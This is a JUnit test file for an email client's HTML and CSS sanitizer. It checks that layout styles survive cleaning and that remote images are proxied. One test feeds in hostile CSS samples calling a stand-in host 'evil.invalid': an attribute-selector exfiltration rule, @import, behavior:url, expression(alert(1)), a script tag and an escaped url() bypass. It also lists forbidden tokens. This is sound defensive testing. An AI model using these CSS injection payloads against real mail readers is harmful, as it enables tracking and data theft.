package com.juanpablo.evermail.util;

import com.juanpablo.evermail.config.*;
import java.io.ByteArrayOutputStream;
import java.time.Duration;
import java.util.concurrent.atomic.AtomicInteger;
import org.jsoup.Jsoup;
import org.junit.jupiter.api.Test;
import static org.junit.jupiter.api.Assertions.*;

class HtmlMailCssTest {
    private Deadline budget() { return Deadline.after(Duration.ofSeconds(10)); }
    private String image() throws Exception {
        var out = new ByteArrayOutputStream();
        javax.imageio.ImageIO.write(new java.awt.image.BufferedImage(2, 2, 1), "png", out);
        return InlineImages.dataUri(out.toByteArray());
    }

    @Test void retainsStylesCascadeMediaQueriesAndTableAttributesAcrossRepeatedCleaning() throws Exception {
        String html = """
                <html><head><style>
                body {margin:0;background-color:#eeeeee;font-family:Arial,sans-serif}
                .card {width:640px;border-spacing:0;border-collapse:collapse}
                .card > tbody > tr > td {padding:24px;vertical-align:top}
                #headline {color:rgb(12,34,56);font-size:28px}
                @media only screen and (max-width:600px) {
                    .card {width:100%!important}
                    .column {display:block!important;width:100%!important;box-sizing:border-box}
                }
                </style></head><body bgcolor="#eeeeee" style="margin:0">
                <table class="card" width="640" cellpadding="0" cellspacing="0" align="center"><tr>
                <td class="column" width="320" valign="top"><h1 id="headline" style="color:#123456">Hello</h1></td>
                <td class="column" width="320">Second column</td></tr></table></body></html>
                """;
        String first = HtmlMail.sanitize(html, cid -> null, null, true, budget()).html();
        String second = HtmlMail.sanitize(first, cid -> null, budget()).html();
        var doc = Jsoup.parse(second);
        assertEquals(1, doc.select("." + MailCss.ROOT).size());
        assertEquals("0", doc.select("table").attr("cellpadding"));
        assertEquals("640", doc.select("table").attr("width"));
        assertEquals("top", doc.select("td").first().attr("valign"));
        assertTrue(doc.select("#headline").attr("style").contains("color:#123456"));
        String css = doc.select("style").first().data();
        assertTrue(css.contains("@media only screen and (max-width:600px)"), css);
        assertTrue(css.contains("display:block!important"), css);
        assertTrue(css.contains("rgb("), css);
        assertTrue(css.contains("." + MailCss.ROOT), css);
    }

    @Test void routesCssAndLegacyBackgroundsThroughSameDeduplicatedProxyResolver() throws Exception {
        String raw = "<style>.banner{background:#fff url('https://images.invalid/banner.png') center / cover no-repeat}</style>"
                + "<table><tr><td class='banner' background='https://images.invalid/banner.png'>Hello</td></tr></table>"
                + "<img src='https://images.invalid/banner.png'>";
        var cached = HtmlMail.sanitize(raw, cid -> null, null, true, budget());
        assertTrue(cached.html().contains("evermail-remote:"));
        assertFalse(cached.html().contains("background=\"https:"));
        AtomicInteger calls = new AtomicInteger();
        String raster = image();
        var display = HtmlMail.sanitize(cached.html(), cid -> null, url -> { calls.incrementAndGet(); return raster; }, false, budget());
        assertEquals(1, calls.get());
        assertFalse(display.html().contains("images.invalid"));
        assertFalse(display.html().contains("evermail-remote:"));
        assertTrue(display.html().contains("background-image:url("));
        assertTrue(display.html().contains("data:image/png;base64,"));
        assertFalse(display.blockedRemoteImages());
        var failed = HtmlMail.sanitize(cached.html(), cid -> null, url -> null, false, budget());
        assertTrue(failed.html().contains("Hello"));
        assertFalse(failed.html().contains("images.invalid"));
        assertTrue(failed.blockedRemoteImages());
    }

    @Test void rejectsActiveCssExternalFontsImportsAndSelectorTricks() throws Exception {
        String raw = """
                <style>
                @import url('https://evil.invalid/style');
                @font-face {font-family:evil;src:url('https://evil.invalid/font')}
                @supports(display:grid){p{position:fixed}}
                @keyframes move{to{left:100px}}
                a[href^='secret']{background:url('https://evil.invalid/exfil')}
                p:has(img){background:url('https://evil.invalid/has')}
                p{position:fixed;z-index:999;behavior:url('https://evil.invalid/code');
                  color:expression(alert(1));width:var(--remote);background:image-set(url('https://evil.invalid/set') 1x);padding:12px}
                </style><p style="color:#123456;position:absolute;cursor:url(https://evil.invalid/cursor),auto;filter:url(https://evil.invalid/filter)">Safe text</p>
                <script>alert(1)</script><link rel="stylesheet" href="https://evil.invalid/sheet">
                """;
        AtomicInteger calls = new AtomicInteger();
        var safe = HtmlMail.sanitize(raw, cid -> null, url -> { calls.incrementAndGet(); return null; }, false, budget());
        assertEquals(0, calls.get());
        for (String forbidden : new String[]{"evil.invalid", "@import", "@font-face", "@supports", "@keyframes", "position:", "expression", "var(", "image-set", "[href", ":has", "<script", "<link"})
            assertFalse(safe.html().contains(forbidden), forbidden + ": " + safe.html());
        assertTrue(safe.html().contains("padding:12px"));
        assertTrue(safe.html().contains("color:#123456"));
    }

    @Test void dropsEscapesMalformedAndDeeplyNestedCssWithoutLosingText() throws Exception {
        for (String css : new String[]{"p{background:u\\72l(https://evil.invalid)}", "p{".repeat(40), "@media screen{".repeat(40), "p{color:rgb(".repeat(40)}) {
            String safe = HtmlMail.sanitize("<style>" + css + "</style><p>Readable</p>", cid -> null, budget()).html();
            assertTrue(safe.contains("Readable"));
            assertFalse(safe.contains("evil.invalid"));
        }
    }

    @Test void backgroundsAndImagesShareTheAggregateByteBudget() throws Exception {
        var pixels = new java.awt.image.BufferedImage(400, 400, java.awt.image.BufferedImage.TYPE_INT_RGB);
        var random = new java.util.Random(42);
        for (int y = 0; y < 400; y++) for (int x = 0; x < 400; x++) pixels.setRGB(x, y, random.nextInt());
        var bytes = new ByteArrayOutputStream();
        javax.imageio.ImageIO.write(pixels, "png", bytes);
        String raster = InlineImages.dataUri(bytes.toByteArray());
        assertNotNull(raster);
        var calls = new AtomicInteger();
        String raw = "<div style=\"background-image:url('https://images.invalid/large')\">Text</div>".repeat(4)
                + "<img src='https://images.invalid/large'>";
        var result = HtmlMail.sanitize(raw, cid -> null, url -> { calls.incrementAndGet(); return raster; }, false, budget());
        assertEquals(1, calls.get());
        assertTrue(result.blockedRemoteImages());
        assertEquals(0, Jsoup.parse(result.html()).select("img[src]").size());
        assertTrue(result.html().contains("Text"));
    }
}
